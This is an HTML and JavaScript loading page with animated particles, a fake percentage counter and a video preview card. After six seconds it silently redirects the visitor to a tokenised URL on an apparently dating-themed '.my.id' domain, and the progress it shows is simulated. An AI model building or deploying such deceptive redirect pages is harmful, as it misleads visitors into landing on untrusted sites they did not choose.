<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

html, body {
  height: 100%;
  color: #fff;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  overflow: hidden;
}

.wrap {
  height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  position: relative;
}

/* Video Background */
.video-bg {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 0;
  overflow: hidden;
}

.video-bg video {
  position: absolute;
  top: 50%;
  left: 50%;
  min-width: 100%;
  min-height: 100%;
  width: auto;
  height: auto;
  transform: translate(-50%, -50%);
  object-fit: cover;
}

.video-overlay {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: linear-gradient(135deg, rgba(15, 23, 42, 0.85) 0%, rgba(30, 41, 59, 0.75) 50%, rgba(51, 65, 85, 0.7) 100%);
  z-index: 1;
}

/* Background animated particles */
.particles {
  position: absolute;
  width: 100%;
  height: 100%;
  overflow: hidden;
  z-index: 1;
  pointer-events: none;
}

.particle {
  position: absolute;
  width: 4px;
  height: 4px;
  background: rgba(255, 255, 255, 0.3);
  border-radius: 50%;
  animation: float 15s infinite;
}

@keyframes float {
  0%, 100% {
    transform: translateY(100vh) rotate(0deg);
    opacity: 0;
  }
  10% {
    opacity: 1;
  }
  90% {
    opacity: 1;
  }
  100% {
    transform: translateY(-100vh) rotate(720deg);
    opacity: 0;
  }
}

/* Main content */
.content {
  z-index: 2;
  text-align: center;
  padding: 20px;
}

/* Modern spinner */
.loader-container {
  position: relative;
  width: 120px;
  height: 120px;
  margin: 0 auto 30px auto;
}

.loader {
  position: absolute;
  width: 100%;
  height: 100%;
  border: 4px solid transparent;
  border-top-color: #3b82f6;
  border-right-color: #8b5cf6;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

.loader-inner {
  position: absolute;
  top: 15px;
  left: 15px;
  right: 15px;
  bottom: 15px;
  border: 4px solid transparent;
  border-top-color: #ec4899;
  border-left-color: #f59e0b;
  border-radius: 50%;
  animation: spin-reverse 1.5s linear infinite;
}

.loader-core {
  position: absolute;
  top: 35px;
  left: 35px;
  right: 35px;
  bottom: 35px;
  background: linear-gradient(135deg, #3b82f6, #ec4899);
  border-radius: 50%;
  animation: pulse 2s ease-in-out infinite;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 24px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

@keyframes spin-reverse {
  to { transform: rotate(-360deg); }
}

@keyframes pulse {
  0%, 100% { transform: scale(1); opacity: 0.8; }
  50% { transform: scale(1.1); opacity: 1; }
}

/* Loading text */
.text {
  font-size: 28px;
  font-weight: 700;
  margin-bottom: 10px;
  background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
  background-size: 200% auto;
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  animation: gradient-shift 3s ease infinite;
}

@keyframes gradient-shift {
  0% { background-position: 0% center; }
  50% { background-position: 100% center; }
  100% { background-position: 0% center; }
}

.subtext {
  font-size: 14px;
  color: rgba(255, 255, 255, 0.6);
  margin-bottom: 25px;
}

/* Progress bar */
.progress-container {
  width: 280px;
  height: 6px;
  background: rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  overflow: hidden;
  margin: 0 auto 15px auto;
}

.progress-bar {
  height: 100%;
  background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
  border-radius: 10px;
  width: 0%;
  animation: loading 3s ease-in-out forwards;
  box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
}

@keyframes loading {
  0% { width: 0%; }
  100% { width: 100%; }
}

/* Percentage counter */
.percentage {
  font-size: 16px;
  font-weight: 600;
  color: #3b82f6;
  font-variant-numeric: tabular-nums;
}

/* Redirect message */
.redirect-msg {
  margin-top: 20px;
  padding: 12px 24px;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 50px;
  font-size: 13px;
  color: rgba(255, 255, 255, 0.7);
  backdrop-filter: blur(10px);
  opacity: 0;
  transform: translateY(10px);
  animation: fade-in-up 0.5s ease forwards 2s;
}

@keyframes fade-in-up {
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.redirect-msg span {
  color: #3b82f6;
  font-weight: 600;
}

/* Video preview card */
.video-preview {
  margin-top: 25px;
  width: 320px;
  max-width: 90vw;
  border-radius: 16px;
  overflow: hidden;
  border: 1px solid rgba(255, 255, 255, 0.1);
  background: rgba(0, 0, 0, 0.3);
  backdrop-filter: blur(10px);
  opacity: 0;
  transform: scale(0.9);
  animation: preview-in 0.6s ease forwards 0.5s;
}

@keyframes preview-in {
  to {
    opacity: 1;
    transform: scale(1);
  }
}

.video-preview video {
  width: 100%;
  height: 180px;
  object-fit: cover;
  display: block;
}

.video-preview-info {
  padding: 12px 16px;
  text-align: left;
}

.video-preview-title {
  font-size: 14px;
  font-weight: 600;
  color: #fff;
  margin-bottom: 4px;
}

.video-preview-meta {
  font-size: 12px;
  color: rgba(255, 255, 255, 0.5);
}

.video-preview-badge {
  display: inline-block;
  padding: 2px 8px;
  background: linear-gradient(90deg, #ec4899, #f59e0b);
  border-radius: 4px;
  font-size: 10px;
  font-weight: 700;
  color: #fff;
  margin-left: 8px;
  vertical-align: middle;
}

/* Responsive */
@media (max-width: 480px) {
  .loader-container {
    width: 100px;
    height: 100px;
  }

  .loader-core {
    top: 28px;
    left: 28px;
    right: 28px;
    bottom: 28px;
    font-size: 20px;
  }

  .text {
    font-size: 24px;
  }

  .progress-container {
    width: 240px;
  }

  .video-preview {
    width: 280px;
  }

  .video-preview video {
    height: 158px;
  }
}
</style>

<script>
// Create floating particles
const particlesContainer = document.getElementById('particles');
for (let i = 0; i < 50; i++) {
  const particle = document.createElement('div');
  particle.className = 'particle';
  particle.style.left = Math.random() * 100 + '%';
  particle.style.animationDelay = Math.random() * 15 + 's';
  particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
  particlesContainer.appendChild(particle);
}

// Animate percentage counter
let percentage = 0;
const percentageEl = document.getElementById('percentage');
const interval = setInterval(() => {
  percentage += Math.floor(Math.random() * 3) + 1;
  if (percentage >= 100) {
    percentage = 100;
    clearInterval(interval);
  }
  percentageEl.textContent = percentage + '%';
}, 50);

// Countdown timer
let countdown = 3;
const countdownEl = document.getElementById('countdown');
const countdownInterval = setInterval(() => {
  countdown--;
  if (countdown <= 0) {
    clearInterval(countdownInterval);
  } else {
    countdownEl.textContent = countdown;
  }
}, 1000);

// Delay redirect
setTimeout(function () {
  window.location.href = "https://cozzydate.my.id/UP0fj453NYsUQu0bPKJs7nWS0aGJkxgN";
}, 6000);
</script>
